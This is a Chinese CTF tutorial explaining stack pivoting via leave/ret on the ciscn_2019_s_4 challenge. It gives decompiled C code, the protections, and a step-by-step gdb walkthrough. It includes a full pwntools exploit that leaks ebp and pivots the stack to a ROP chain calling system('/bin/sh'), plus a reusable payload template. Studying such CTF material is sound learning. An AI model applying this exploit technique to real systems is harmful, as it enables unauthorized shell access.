---
title: PWN之栈迁移详解
description: 本文深入浅出地讲解了栈迁移技术的原理、利用条件和完整的EXP编写过程。
tags:
  - stack
  - pwn
---

## 一.栈迁移
例题下载地址:[ciscn_2019_s_4](https://buuoj.cn/challenges#ciscn_2019_s_4)
## 1.前景导入
 一个栈题关键代码如下：
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  puts("Welcome, my friend. What's your name?");
  vul();
  return 0;
}
 ```
```c
int init()
{
  setvbuf(stdin, 0, 2, 0);
  return setvbuf(stdout, 0, 2, 0);
}
```

```c
int vul()
{
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  read(0, s, 0x30u);
  printf("Hello, %s\n", s);
  read(0, s, 0x30u);
  return printf("Hello, %s\n", s);
}
```

```c
int hack()
{
  return system("echo flag");
}
```
检查保护：
```shell
 checksec ciscn_2019_s_4                                                                                                                   [*] '/home/today/main/ctf/pwn/buu/ciscn_2019_s_4'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
- 我们能发现溢出空间只有0x30-0x28-0x4=4字节，这四字节似乎也无法构造ROP链，该怎么办呢
## 2.必备知识-32为例
## 2.1 leave指令
[寄存器]即寄存器保存的地址上的数据，即此时寄存器是二级指针，[寄存器]`即**寄存器`，
`leave`等价于
```nasm
mov esp,ebp  ；把栈顶指针从栈顶移动到栈底
pop ebp
```
**注意了**:pop ebp等价于
```nasm
mov ebp, [esp]  ; 将当前栈顶的值（即调用者之前保存的 ebp）写入 ebp 寄存器
add esp, 4      ; 栈顶指针上移 4 字节，指向返回地址
```
### 2.2函数尾声
标准的函数尾声:
```nasm
leave 
ret  
```
### 2.3图解
![[Pasted image 20260518193107.png]]
`ret`图解
![[Pasted image 20260518193412.png]]
## 3.栈迁移
### 3.1 原理
原理应该还得自己在gdb一步步看，实例exp（我用tmux):
```python
from pwn import *
context.binary = './ciscn_2019_s_4'
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
p = process('./ciscn_2019_s_4')
#p = remote('node5.buuoj.cn',28336)

leave_ret = 0x08048562
system = 0x8048400

p.recv()
gdb.attach(p, gdbscript="""
set disassembly-flavor intel
set follow-fork-mode parent
b *0x80485fc
c
""")
#p.sendline(b'a'*0x27+b'B')
payload0 =b'a'*0x27+b'B'
p.send(payload0)
p.recvuntil('B')
ebp = u32(p.recv(4))
p.recv()

payload = (b'aaaa'+p32(system)+p32(0)+p32(ebp-0x28)+b'/bin/sh').ljust(0x28,b'\x00')+p32(ebp-0x38)+p32(leave_ret)
p.sendline(payload)
p.interactive()
```
- 现在在vul函数的nop中下了断点，等发送了两次payload就会停在vul函数的nop中，nop指令后面是`leave`和`ret`，正常的执行流程是**leave后就让ebp回到main函数的栈帧**，但被我们把ebp覆盖成栈顶了，这样就把栈底覆盖到栈顶了。现在看实际的内存情况
### 3.2调试分析栈迁移：
![[Pasted image 20260518200149.png]]
现在程序执行了NOP,停在`leave`之前,我们发现，`ebp`处的值已经被我们覆盖为栈顶的地址了，ebp+4的返回地址被我们覆盖为leave ,ret指令,我们把rop链放到了栈顶上。接下来执行下一条汇编指令,leave:
![[Pasted image 20260518200623.png]]
现在已经执行了`leave`,ebp被迁移到原来栈顶的位置，而esp移动到返回地址上，准备执行函数原来就有的ret指令，而返回地址上是`leave,ret`,我们执行下一条汇编指令：ret即pop eip
![[Pasted image 20260518201620.png]]
现在，我们的payload里面的`leave,ret`被填入eip寄存器，即将再次执行`leave `
，将会把esp指针放到ebp处，即esp又回到最开始的栈顶，以便执行我们的rop链，然后ebp指向0xaaaa![[Pasted image 20260518201922.png]]
现在栈迁移完成了，然后还有一个`leave,ret`的指令里面的`ret`指令即将执行，使得esp指针抬高四字节，指向system,最终执行`system('bin/sh')
![[Pasted image 20260518202131.png]]
	栈迁移原理大概就是这样，最好自己gdb调试看看
	
### 3.3 payload的构造
payload的构造主要就是要理解把栈迁移到原来的栈顶上，大概就是这样的模板：
```python
payload = (b'aaaa'+p32(system)+p32(0)+p32(ebp-0x28)+b'/bin/sh').ljust(0x28,b'\x00')+p32(ebp-0x38)+p32(leave_ret)
```